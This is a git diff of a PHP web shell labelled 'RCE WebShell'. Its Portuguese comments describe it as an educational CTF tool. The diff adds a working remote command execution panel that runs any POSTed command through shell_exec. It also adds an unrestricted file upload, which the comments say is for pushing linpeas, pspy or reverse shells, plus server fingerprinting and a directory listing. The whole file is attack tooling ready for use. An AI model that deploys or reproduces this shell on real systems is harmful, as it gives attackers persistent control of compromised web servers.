@@ -1,25 +1,106 @@
 <?php
 
-// Pega o diretório atual
+/**
+ * ============================================================
+ * RCE WebShell - Painel de Execução Remota de Comandos
+ * ============================================================
+ * Autor: Henrique Demezio
+ * Objetivo: Ferramenta educacional para estudos de CTF e
+ *           exploração de Remote Command Execution (RCE).
+ *
+ * ATENÇÃO:
+ * Este código deve ser utilizado apenas em ambientes
+ * controlados, como laboratórios ou CTFs.
+ * ============================================================
+ */
+
+
+/**
+ * ------------------------------------------------------------
+ * Informações do sistema
+ * ------------------------------------------------------------
+ * Estas variáveis coletam dados do servidor onde a shell está
+ * sendo executada.
+ */
+
+// Diretório atual onde o script está rodando
 $currentDir = getcwd();
 
-// Executa o comando para ver qual é o usuario atual
+// Usuário do sistema executando o servidor web (geralmente www-data)
 $user = trim(shell_exec('whoami'));
 
-// Pega o host
+// Nome do host da máquina
 $host = gethostname();
 
-// Guarda o comando enviado através do formulário
+// IP do servidor web
+$ip = $_SERVER['SERVER_ADDR'] ?? 'unknown';
+
+// Versão do PHP instalada no servidor
+$php = phpversion();
+
+// Informações completas do sistema operacional
+$os = php_uname();
+
+
+/**
+ * ------------------------------------------------------------
+ * Execução de comandos
+ * ------------------------------------------------------------
+ * Recebe um comando enviado via POST e executa usando shell_exec.
+ */
+
+// Comando enviado pelo formulário
 $cmd = $_POST['cmd'] ?? null;
 
-// Guarda a saída gerada pelo comando
+// Variável para armazenar saída do comando
 $output = '';
 
-// Verifica se existe comando vindo via post
 if ($cmd) {
-    // Se sim, vai guardar o comando executado, e usar o shell_exec para executar o comando na marquina alvo.
+
+    /**
+     * shell_exec executa comandos no sistema operacional.
+     *
+     * "2>&1" redireciona erros para a saída padrão, permitindo
+     * capturar erros também.
+     */
     $output = shell_exec($cmd . " 2>&1");
 }
+
+
+/**
+ * ------------------------------------------------------------
+ * Upload de arquivos
+ * ------------------------------------------------------------
+ * Permite enviar arquivos para o servidor.
+ * Muito usado em CTF para enviar ferramentas como:
+ *
+ * - linpeas.sh
+ * - pspy
+ * - reverse shells
+ */
+
+if (isset($_FILES['file'])) {
+
+    move_uploaded_file(
+
+        // arquivo temporário enviado pelo navegador
+        $_FILES['file']['tmp_name'],
+
+        // destino final
+        $currentDir . '/' . $_FILES['file']['name']
+    );
+}
+
+
+/**
+ * ------------------------------------------------------------
+ * File Manager
+ * ------------------------------------------------------------
+ * Lista todos os arquivos e diretórios do diretório atual.
+ */
+
+// scandir retorna lista de arquivos/pastas
+$files = scandir($currentDir);
 
 ?>
 
@@ -27,56 +108,40 @@ if ($cmd) {
 <html lang="pt_BR">
 
 <head>
+
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>RCE Control Panel</title>
+    <title>RCE - WebShell</title>
 
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet">
 
     <style>
+        /**
+ * ------------------------------------------------------------
+ * Estilo visual (Hacker Theme)
+ * ------------------------------------------------------------
+ */
+
         body {
-            background: #020617;
+            background: #010409;
             color: #00ff9c;
-            font-family: "Courier New", monospace;
+            font-family: monospace;
         }
 
-        .panel {
-            max-width: 1000px;
-            margin: auto;
-            margin-top: 50px;
+        .card {
             background: #000;
-            border-radius: 10px;
-            border: 1px solid #00ff9c;
-            box-shadow: 0 0 25px #00ff9c33;
+            border: 1px solid #00ff9c33;
+            box-shadow: 0 0 10px #00ff9c22;
+            color: greenyellow;
         }
 
-        .panel-header {
+        .card-header {
             background: #020617;
-            padding: 10px 20px;
             border-bottom: 1px solid #00ff9c33;
         }
 
-        .panel-title {
-            color: #00ff9c;
-            font-weight: bold;
-        }
-
-        .system-info {
-            font-size: 14px;
-            color: #38bdf8;
-        }
-
         .terminal {
-            padding: 20px;
-        }
-
-        .prompt {
-            color: #38bdf8;
-        }
-
-        .output {
-            margin-top: 15px;
             background: #020617;
             padding: 15px;
             border-radius: 6px;
@@ -90,36 +155,17 @@ if ($cmd) {
             border: 1px solid #00ff9c !important;
         }
 
-        input:focus {
-            box-shadow: 0 0 10px #00ff9c55 !important;
+        .table {
+            color: #00ff9c;
         }
 
-        .btn-run {
+        .btn-hack {
             background: #00ff9c;
             color: #000;
-            border: none;
         }
 
-        .btn-run:hover {
+        .btn-hack:hover {
             background: #00cc7a;
-        }
-
-        .cursor {
-            animation: blink 1s infinite;
-        }
-
-        @keyframes blink {
-            0% {
-                opacity: 0
-            }
-
-            50% {
-                opacity: 1
-            }
-
-            100% {
-                opacity: 0
-            }
         }
     </style>
 
@@ -127,76 +173,175 @@ if ($cmd) {
 
 <body>
 
-    <div class="panel">
+    <div class="container mt-4">
 
-        <div class="panel-header">
+        <h3 class="mb-4">Remote Code Execution</h3>
 
-            <div class="d-flex justify-content-between">
+        <div class="row">
 
-                <div class="panel-title">
-                    Remote Command Console
-                </div>
+            <!-- =========================================================
+     SYSTEM INFO
+========================================================= -->
 
-                <div class="system-info">
-                    <?= $user ?>@<?= $host ?>
-                </div>
+            <div class="col-md-4">
 
-            </div>
+                <div class="card mb-4">
 
-        </div>
-
-        <div class="terminal">
-
-            <div class="mb-2 system-info">
-                Diretório atual: <?= htmlspecialchars($currentDir) ?>
-            </div>
-
-            <form method="POST">
-
-                <div class="input-group">
-
-                    <span class="input-group-text prompt">
-                        <?= $user ?>@<?= $host ?>:$
-                    </span>
-
-                    <input
-                        type="text"
-                        name="cmd"
-                        class="form-control"
-                        placeholder="Digite um comando..."
-                        autocomplete="off"
-                        autofocus>
-
-                    <button class="btn btn-run">
-                        Run
-                    </button>
-
-                </div>
-
-            </form>
-
-            <?php if ($cmd): ?>
-
-                <div class="output">
-
-                    <div class="mb-2">
-                        <span class="prompt"><?= $user ?>@<?= $host ?>:$</span>
-                        <?= htmlspecialchars($cmd) ?>
+                    <div class="card-header">
+                        System Info
                     </div>
 
-                    <?= htmlspecialchars($output ?: "Sem saída") ?>
+                    <div class="card-body">
 
-                    <span class="cursor">█</span>
+                        <p><b>User:</b> <?= $user ?></p>
+                        <p><b>Host:</b> <?= $host ?></p>
+                        <p><b>IP:</b> <?= $ip ?></p>
+                        <p><b>PHP:</b> <?= $php ?></p>
+                        <p><b>OS:</b> <?= $os ?></p>
+
+                    </div>
 
                 </div>
 
-            <?php endif; ?>
+
+                <!-- =========================================================
+     UPLOAD DE ARQUIVOS
+========================================================= -->
+
+                <div class="card">
+
+                    <div class="card-header">
+                        Upload File
+                    </div>
+
+                    <div class="card-body">
+
+                        <form method="POST" enctype="multipart/form-data">
+
+                            <input type="file" name="file" class="form-control mb-2">
+
+                            <button class="btn btn-hack w-100">
+                                Upload
+                            </button>
+
+                        </form>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+
+            <!-- =========================================================
+     TERMINAL / EXECUÇÃO DE COMANDOS
+========================================================= -->
+
+            <div class="col-md-8">
+
+                <div class="card mb-4">
+
+                    <div class="card-header">
+                        Command Execution
+                    </div>
+
+                    <div class="card-body">
+
+                        <form method="POST">
+
+                            <div class="input-group mb-3">
+
+                                <span class="input-group-text">
+                                    <?= $user ?>@<?= $host ?>:$
+                                </span>
+
+                                <input
+                                    type="text"
+                                    name="cmd"
+                                    class="form-control"
+                                    placeholder="Digite um comando..."
+                                    autofocus>
+
+                                <button class="btn btn-hack">
+                                    Run
+                                </button>
+
+                            </div>
+
+                        </form>
+
+                        <div class="terminal text-white">
+
+                            <?php if ($cmd): ?>
+
+                                <pre><?= htmlspecialchars($cmd) . "\n\n" ?></pre>
+
+                                <pre><?= htmlspecialchars($output ?: "Sem saída") ?></pre>
+
+                            <?php endif; ?>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+
+                <!-- =========================================================
+     FILE MANAGER
+========================================================= -->
+
+                <div class="card">
+
+                    <div class="card-header">
+                        File Manager
+                    </div>
+
+                    <div class="card-body">
+
+                        <table class="table table-sm">
+
+                            <thead>
+                                <tr>
+                                    <th>Name</th>
+                                    <th>Type</th>
+                                    <th>Size</th>
+                                </tr>
+                            </thead>
+
+                            <tbody>
+
+                                <?php foreach ($files as $file): ?>
+
+                                    <tr>
+
+                                        <td><?= $file ?></td>
+
+                                        <td>
+                                            <?= is_dir($file) ? 'DIR' : 'FILE' ?>
+                                        </td>
+
+                                        <td>
+                                            <?= is_file($file) ? filesize($file) : '-' ?>
+                                        </td>
+
+                                    </tr>
+
+                                <?php endforeach; ?>
+
+                            </tbody>
+
+                        </table>
+
+                    </div>
+
+                </div>
+
+            </div>
 
         </div>
 
     </div>
-
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js"></script>
 
 </body>
 
